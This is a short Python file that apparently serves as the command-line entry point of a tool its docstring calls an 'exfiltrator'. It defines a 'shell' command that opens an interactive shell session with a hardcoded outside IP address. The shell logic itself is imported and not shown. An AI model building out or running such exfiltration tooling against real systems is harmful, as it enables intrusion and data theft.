"""
CLI interface for the exfiltrator.
"""
import typer

from interactive_shell.interactive_shell import InteractiveShell

IP_ADDRESS = "169.123.123.123"

cli = typer.Typer()


@cli.command()
def shell() -> None:
    InteractiveShell.interactive(IP_ADDRESS)


if __name__ == '__main__':
    cli()
